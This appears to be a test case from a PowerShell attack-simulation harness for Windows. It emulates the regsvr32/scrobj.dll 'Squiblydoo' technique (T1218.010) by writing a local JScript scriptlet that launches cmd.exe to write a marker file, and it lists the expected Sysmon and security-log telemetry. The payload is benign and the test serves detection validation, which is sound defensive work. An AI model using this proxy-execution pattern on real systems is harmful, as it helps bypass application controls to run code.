Invoke-A36Test -Id 's8' -Technique 'T1218.010' -Summary 'regsvr32 runs a local JScript scriptlet through scrobj.dll (Squiblydoo pattern, local file only) and the script starts cmd.exe (T1218.010)' -Telemetry @('sysmon:1', 'sec:4688') -Attempt {
  $mk = Join-Path $script:A36Work 'sct-marker.txt'
  $sct = Join-Path $script:A36Work 'payload.sct'
  $bs = [string][char]92; $dq = [string][char]34
  $jp = $mk.Replace($bs, $bs + $bs)
  $js = 'var s=new ActiveXObject(' + $dq + 'WScript.Shell' + $dq + ');s.Run(' + $dq + 'cmd.exe /c echo ' + $script:A36Marker + ' > ' + $bs + $dq + $jp + $bs + $dq + $dq + ',0,true);'
  $body = '<?XML version="1.0"?><scriptlet><registration progid="BasSim.Sct" classid="{' + [guid]::NewGuid().ToString() + '}"><script language="JScript"><![CDATA[' + $js + ']]></script></registration></scriptlet>'
  Set-Content -LiteralPath $sct -Value $body -Encoding ASCII
  $p = Invoke-A36Proc -File (Join-Path $env:SystemRoot 'System32\regsvr32.exe') -ArgLine ('/s /n /u /i:"' + $sct + '" scrobj.dll') -TimeoutSec 25 -NoShell
  for ($i = 0; $i -lt 10 -and -not (Test-A36Marker $mk); $i++) { Start-Sleep -Milliseconds 300 }
  return @{ Ran = (Test-A36Marker $mk); Note = "regsvr32_started=$($p.Started) timed_out=$($p.TimedOut) scriptlet_source=local_file remote_fetch=false"; NotApplicable = '' }
}
